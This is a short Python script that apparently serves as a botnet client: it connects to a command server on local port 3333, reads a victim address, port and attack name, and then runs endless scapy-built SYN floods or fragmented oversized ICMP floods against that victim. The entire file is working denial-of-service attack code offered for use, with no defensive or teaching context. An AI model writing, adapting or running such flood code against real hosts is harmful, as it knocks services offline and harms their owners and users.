from socket import *
from scapy.all import *
import os, sys

victimIp = "0"
victimPort = 80
host = "127.0.0.1"
botnet = socket.socket(AF_INET, SOCK_STREAM)

def listen():
	msg = botnet.recv(35).decode()
	data = msg.split(' ')
	victimIp = data[0]
	victimPort = data[1]
	attack = data[2]
	print(victimIp)
	print(victimPort)
	print(attack)
	
	if (attack == "synflood"):
		while 1:
			print("syn")
			p=IP(dst=victimIp,id=1111,ttl=99)/TCP(sport=RandShort(),dport=int(victimPort) ,seq=12345,ack=1000,window=1000,flags="S")
			send(p, verbose=0, count=100)

	elif (attack == "ddos"):
		while 1:
			print("ddos")
			send(fragment(IP(dst=victimIp) / ICMP() / ("X"*60000)))

botnet.connect((host,int("3333")))
print("[INFO] Connected")
listen()
